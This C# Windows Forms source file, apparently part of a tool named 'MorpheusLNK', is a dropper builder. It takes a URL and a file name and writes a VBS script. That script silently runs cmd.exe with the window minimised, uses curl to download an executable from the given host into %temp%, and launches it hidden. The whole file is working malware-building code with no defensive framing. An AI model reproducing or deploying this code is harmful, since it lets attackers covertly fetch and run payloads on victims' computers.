using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace MorpheusLNK
{
    public partial class VBS_DROPPER : Form
    {
        public VBS_DROPPER()
        {
            InitializeComponent();
        }

        private void vbsBuild_btn_Click(object sender, EventArgs e)
        {
            string url = downloadUrl_Box.Text;
            string exeName = afterExe_Name.Text;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(exeName))
            {
                SetStatusLabel("Status: Error form cannot be empty!", Color.Red);
                return;
            }

            try
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                saveFileDialog1.Filter = "VBS files|*.vbs";
                saveFileDialog1.Title = "Save VBS Scriptlet";
                saveFileDialog1.ShowDialog();

                if (saveFileDialog1.FileName != "")
                {
                    string filePath = saveFileDialog1.FileName;
                    string vbsContent = GenerateVBSscript(url, exeName);
                    File.WriteAllText(filePath, vbsContent);
                    SetStatusLabel("VBS script created successfully!", Color.Green);
                }
                else
                {
                    SetStatusLabel("Status: VBS script build failed!", Color.Red);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"{ex}");
            }
        }

        private string GenerateVBSscript(string url, string exeName)
        {
            string cmdCommand = $"/c mode 15,1 & curl {url} -o %temp%\\{exeName} & start /b %temp%\\{exeName}";
            string vbscript = $@"
Set objShell = CreateObject(""WScript.Shell"")
command = ""cmd.exe {cmdCommand}""
objShell.Run command, 0, True
";
            return vbscript;
        }

        private async void SetStatusLabel(string text, Color color)
        {
            statusLabel.ForeColor = color;
            statusLabel.Text = text;
            await Task.Delay(3000);
            statusLabel.Text = "";
        }
    }
}
